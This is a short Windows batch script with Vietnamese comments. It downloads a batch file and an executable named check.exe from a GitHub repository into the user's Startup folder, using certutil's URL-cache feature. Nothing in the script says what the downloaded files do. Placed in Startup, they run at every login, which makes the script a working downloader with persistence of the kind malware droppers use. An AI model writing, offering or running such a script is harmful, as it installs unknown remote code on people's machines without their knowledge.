@echo off
setlocal enabledelayedexpansion

set "batFileUrl1=https://github.com/nobita2906/file_vm/raw/main/check-proxy.bat"
set "batFileUrl2=https://raw.githubusercontent.com/nobita2906/file_vm/main/check.exe"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "batFilePath1=%startupFolder%\check-proxy.bat"
set "batFilePath2=%startupFolder%\check.exe"

:: Màu đỏ cho lỗi
set "errorColor=0C"

:: Màu xanh cho thành công
set "successColor=0A"

:: Tải check-proxy.bat
echo Tai check-proxy.bat...
certutil -urlcache -split -f "%batFileUrl1%" "%batFilePath1%"
if %ERRORLEVEL% neq 0 (
    color %errorColor%
    echo Loi khi tai check-proxy.bat
) else (
    color %successColor%
    echo Da tai thanh cong check-proxy.bat
)

:: Tải check.exe
echo Tai check.exe...
certutil -urlcache -split -f "%batFileUrl2%" "%batFilePath2%"
if %ERRORLEVEL% neq 0 (
    color %errorColor%
    echo Loi khi tai check.exe
) else (
    color %successColor%
    echo Da tai thanh cong check.exe
)

:: Giữ CMD mở sau khi thực thi xong
pause

:: Đặt lại màu sắc về mặc định
color 07
